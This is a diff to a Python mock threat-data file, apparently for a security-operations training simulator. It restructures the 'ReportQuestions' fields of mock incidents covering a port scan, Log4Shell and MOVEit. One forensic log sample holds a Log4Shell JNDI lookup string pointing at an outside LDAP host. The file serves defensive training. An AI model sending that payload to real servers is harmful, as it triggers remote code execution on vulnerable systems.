@@ -41,9 +41,9 @@ MOCK_THREAT_POOL = [
         "Forensics": {
             "type": "PCAP_SNIPPET",
             "data": "IP 192.168.1.45.54212 > 192.168.1.1.80: Flags [S], seq 12345, win 64240\nIP 192.168.1.45.54213 > 192.168.1.1.443: Flags [S], seq 67890, win 64240"
-        }
+        },
+        "ReportQuestions": ["Identify the source IP and scanning tool used:", "List critical assets probed during the scan:", "Provide firewall rule recommendations to prevent recurrence:"]
     },
-    "ReportQuestions": ["Identify the source IP and scanning tool used:", "List critical assets probed during the scan:", "Provide firewall rule recommendations to prevent recurrence:"]
     {
         "ID": "TR-1081", "Severity": "Critical", "Source": "Suricata", "Vector": "Log4Shell RCE", "Status": "Active", "lat": 51.5074, "lon": -0.1278, "MITRE": "T1190", "CVE": "CVE-2021-44228", 
         "Playbook": ["Disable JNDI", "Patch Log4j", "WAF Filter"], "Correct": "Patch Log4j", 
@@ -58,8 +58,8 @@ MOCK_THREAT_POOL = [
                 "user_agent": "${jndi:ldap://104.248.x.x:1389/a}",
                 "path": "/api/v1/auth"
             }
-            },
-            "ReportQuestions": ["Identify the malicious JNDI string used in the exploit:", "Confirm the library and patch versions involved:", "Was there evidence of data exfiltration following the RCE?"]
+        },
+        "ReportQuestions": ["Identify the malicious JNDI string used in the exploit:", "Confirm the library and patch versions involved:", "Was there evidence of data exfiltration following the RCE?"]
     },
     {
         "ID": "TR-1084", "Severity": "Critical", "Source": "Darktrace", "Vector": "MOVEit Transfer Exfil", "Status": "Active", "lat": 40.7128, "lon": -74.0060, "MITRE": "T1190", "CVE": "CVE-2023-34362", 
